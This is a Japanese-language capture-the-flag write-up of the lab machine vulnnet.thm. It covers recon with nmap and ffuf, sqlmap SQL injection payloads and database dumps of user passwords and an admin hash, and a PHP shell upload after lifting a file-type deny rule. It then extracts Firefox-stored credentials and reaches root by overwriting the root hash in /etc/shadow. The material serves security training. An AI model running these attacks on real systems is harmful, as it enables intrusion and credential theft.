## Enum
```
nmap -Pn -sVC 10.10.133.73 -p 22,80 
Nmap scan report for vulnnet.thm (10.10.133.73)
Host is up.

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp filtered http
```
```
nmap -Pn -sVC 10.10.133.73 -p 22,80 -vv -T4
Host is up, received user-set (0.39s latency).

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb2ee6cc79f47d682c11bc4b631908af (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQRQ5sGPZniwdg1TNW71UdA6dc2k3lpZ68EnacCUgKEqZT7sBvppGUJjSAMY7aZqdZJ0m5N9SQajB9iW3ZEKHM5qtbXOadbWkRKp3VrqtZ8VW1IthLa2+oLObY2r1qep6O2NqrghQ/yVCbJYF5H8BsTtjCVNBeVSzf9zetwUviO6xfqIRO3iM+8S2WpZwKGtrBFvA9RaBsqLBGB1XGUjufKxyRUzOx1J2I94Xhs/bDcaOV5Mw6xhSTxgS3q6xVmL6UU3hIbpiXzYcj2vxuAXXszyZCM4ZkxmQ1fddQawxHfmZRnqxVogoHDsOGgh9tpQsc+S/KTrYQa9oFEVARV70x
|   256 8061bf8caad14d4468154533edeb82a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg9Hw4CIelacGVS0U+uFcwEj183dT+WrY/tvJV4U8/1alrGM/8gIKHEQIsU4yGPtyQ6M8xL9q7ak6ze+YsHd2o=
|   256 878604e9e0c0602aab878e9bc705351c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJDCCks5eMviLJyDQY/oQ3LLgnDoXvqZS0AxNAJGv9T
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Webサーバ。Fuzzしたけど空振りなので、サブドメインを探す。

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm -H "HOST:FUZZ.vulnnet.thm" -fs 65

[Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 405ms]
    * FUZZ: blog

[Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 415ms]
    * FUZZ: shop

[Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 610ms]
    * FUZZ: api

[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 5123ms]
    * FUZZ: admin1

:: Progress: [4989/4989] :: Job [1/1] :: 69 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/236607640-bfe5efd8-044a-4373-bf3b-62dd0be28535.png)

![image](https://user-images.githubusercontent.com/6504854/236607654-5b3745ca-e0d5-405e-9157-5efc5e5ecd24.png)

![image](https://user-images.githubusercontent.com/6504854/236607673-c57f2473-4188-4800-a3c4-cded88425095.png)

![image](https://user-images.githubusercontent.com/6504854/236607683-bff21815-5b2e-40c2-829e-6b3996937bda.png)

こんな感じ、問題からadmin1が最優先だろというあたりで。

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://admin1.vulnnet.thm/FUZZ -fc 307

[Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 359ms]
    * FUZZ: en

[Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 346ms]
    * FUZZ: vendor

[Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 352ms]
    * FUZZ: fileadmin

[Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 409ms]
    * FUZZ: typo3temp

```

![image](https://user-images.githubusercontent.com/6504854/236608456-b5108f57-ea21-4493-b17b-1de6d3a1fc50.png)

![image](https://user-images.githubusercontent.com/6504854/236608468-f55e3828-3e63-42e5-aca9-f0c497434498.png)

![image](https://user-images.githubusercontent.com/6504854/236608493-e1d069ea-db66-40ec-b6f9-b3875989d983.png)

![image](https://user-images.githubusercontent.com/6504854/236608515-e0654256-c3b7-4603-ad2e-9cb2bda34e86.png)

なんかのCMSらしい。

![image](https://user-images.githubusercontent.com/6504854/236608679-03abb9be-8dcf-4396-9f85-0c3906137830.png)

デフォルトのURLでログイン口がみえる。admin/adminで入れない。古いバージョンだとRCEあるっぽいけど、履歴から割と最近のバージョン10以上っぽい。
めぼしいエクスプロイトなし。どうしたものか。どっかからユーザ探す？。

![image](https://user-images.githubusercontent.com/6504854/236609100-b07925ae-8b0d-4f74-bd90-6d4999326ca8.png)

このパラメータにSQLiがある。ここ探すのが一番時間かかった。

![image](https://user-images.githubusercontent.com/6504854/236610784-c9de7923-30a9-4d4c-a1db-3501d3b52838.png)

![image](https://user-images.githubusercontent.com/6504854/236610823-3d182be4-1d0f-4666-a17d-75f3f39fbec4.png)

```
sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --batch --dbs                 

---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 7604=7604

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7299 FROM (SELECT(SLEEP(5)))ituG)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-4953 UNION ALL SELECT NULL,NULL,CONCAT(0x7171707671,0x4850476a6f59766d4e696c5849744b53544e506b495773795a667544496444614762415a4f446b68,0x7178767a71)-- -
---
[16:47:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[16:47:04] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin
```

```
sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D vn_admin --tables --thread 10 

Database: vn_admin
[48 tables]
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_users                                    |
+----------------snip-------------------------+
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
+---------------------------------------------+


sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D vn_admin -T be_users --columns --thread 10

Database: vn_admin
Table: be_users
[34 columns]
+-----------------------+----------------------+
| Column                | Type                 |
+-----------------------+----------------------+
| admin                 | smallint(5) unsigned |
----snip---------------------------------------+
| password              | varchar(100)         |
----snip---------------------------------------+
| username              | varchar(50)          |
----snip---------------------------------------+

sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D vn_admin -T be_users -C password,username --dump --thread 10 

Database: vn_admin
Table: be_users
[1 entry]
+---------------------------------------------------------------------------------------------------+----------+
| password                                                                                          | username |
+---------------------------------------------------------------------------------------------------+----------+
| $argon2i$v=************************************************************************************Rg | chris_w  |
+---------------------------------------------------------------------------------------------------+----------+
```

rockyouまわしたけどだめだった。もういやになる。。。

```
sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D blog --tables --thread 10
Database: blog
[4 tables]
+------------+
| blog_posts |
| details    |
| metadata   |
| users      |
+------------+
                    
sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D blog -T users --dump --thread 10

Database: blog
Table: users
[651 entries]
+-----+---------------------+--------------------+
| id  | password            | username           |
+-----+---------------------+--------------------+
| 396 | D8Gbl8mnxg          | lspikinsaz         |
-----snip----------------------------------------
| 651 | BIkqvmX             | rtamblingi2        |
+-----+---------------------+--------------------+

[19:10:40] [INFO] table 'blog.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv'
[19:10:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 19:10:40 /2023-05-06/

```
ダンプしたパスワードHashをつかってみる。

```
cut -d "," -f 3 > pass.txt
```
![image](https://user-images.githubusercontent.com/6504854/236619348-67d9959b-6c96-4575-9bbd-38b43b1ce710.png)

パスワードはわれた。ログインはできた。

![image](https://user-images.githubusercontent.com/6504854/236619871-4cbe67f2-b01e-4002-8a11-cb9f2ccb40d9.png)

WWW-dataようにファイルアップロードしようとしたが、ファイル制限で、アップロードできない。

![image](https://user-images.githubusercontent.com/6504854/236621885-02d3c5a6-e5ff-4e5d-827b-347050aa2a97.png)

Deny解除する。1.phpはいつもの。

## Flag(User)
![image](https://user-images.githubusercontent.com/6504854/236622435-c8e3b74e-d91f-4624-833e-af9d874ef887.png)

![image](https://user-images.githubusercontent.com/6504854/236623006-4982afe4-4938-4f99-a0cd-18b78f3bc04f.png)

FireFoxのプロファイルからパスワードとれるツールがあるきがする。
とりま/tmpにファイル作れたのでそちらにTarでかためておく。

![image](https://user-images.githubusercontent.com/6504854/236624183-c9322118-6128-45b6-86da-67f4d3df2a2c.png)

ローカルDLしてきて、ツールで解析。これを使用。
https://github.com/unode/firefox_decrypt

![image](https://user-images.githubusercontent.com/6504854/236624477-d60b0480-78d2-4e86-b635-068b5ea3477d.png)

## Flag(Root)

いつもの豆投入。

![image](https://user-images.githubusercontent.com/6504854/236628860-e61e6cf8-0345-4a86-9a11-886e11c11ee7.png)

polkitはパッチあたってるっぽくダメ。sudo -lがひけなかったので、sudoもだめ。んー。
Opensslを介して入出力できれば、できるのか？

![image](https://user-images.githubusercontent.com/6504854/236630412-2aa84b35-1b1e-46d8-b1ce-b704f987c603.png)

![image](https://user-images.githubusercontent.com/6504854/236630524-3933d21b-81aa-4d21-8305-7723ab5232b7.png)

![image](https://user-images.githubusercontent.com/6504854/236630560-132eedac-82cd-4d6e-b377-d3fc6c585e05.png)

ん？

![image](https://user-images.githubusercontent.com/6504854/236630678-26609023-28f1-4211-8820-6301b9fadce9.png)

書き込める先にコピー。

```
root:$6$9oaZwdNG$jrpl883V5yMMdPAFvncio.JaEw3lx7by788qoORBJ1pV5OSGlfBX/ZjkI6qAEf.7Imb7rs6iaBlI4RBxcn.5w.:19157:0:99999:7:::
daemon:*:18885:0:99999:7:::
gdm:*:18885:0:99999:7:::
system:$6$9oaZwdNG$jrpl883V5yMMdPAFvncio.JaEw3lx7by788qoORBJ1pV5OSGlfBX/ZjkI6qAEf.7Imb7rs6iaBlI4RBxcn.5w.:19157:0:99999:7:::
```
rootのパスを同じパスに編集して上書き。

![image](https://user-images.githubusercontent.com/6504854/236630976-e022a22c-5dcb-4736-8a87-54125ed1831b.png)

もとの場所に戻して、同じパスで入れた。

PwnCatよりSSHつかえるならSSHして、WgetとPythonでやってるほうが早いきする。
コマンドが老人なきがする。うぅ。

👏㊗️👏㊗️👏㊗️👏㊗️👏㊗️👏㊗️
これだけで連休つかれちゃったし、地震はくるわ、風が強すぎるわ、隠れて生きのびていこ。
おつした。

